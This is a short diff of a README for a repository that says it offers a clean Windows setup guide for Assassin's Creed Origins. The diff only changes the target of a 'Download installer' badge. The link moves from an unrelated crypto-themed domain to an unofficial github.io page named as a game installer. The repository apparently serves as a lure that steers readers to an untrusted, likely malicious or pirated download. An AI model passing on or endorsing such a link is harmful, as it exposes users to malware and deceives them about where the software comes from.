@@ -2,7 +2,7 @@
 
 This repository covers a clean Windows setup for **Assassin S Creed Origins** — launcher linking, file verification, performance tuning, and safe DLC/save workflows.
 
-[![Download Assassin S Creed Origins](https://img.shields.io/badge/Download-assassin--s--creed--origins--installer-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Assassin S Creed Origins](https://img.shields.io/badge/Download-assassin--s--creed--origins--installer-blueviolet)](https://mitzibestekknfk.github.io/.github/ac-origins-installer)
 
 ---
 
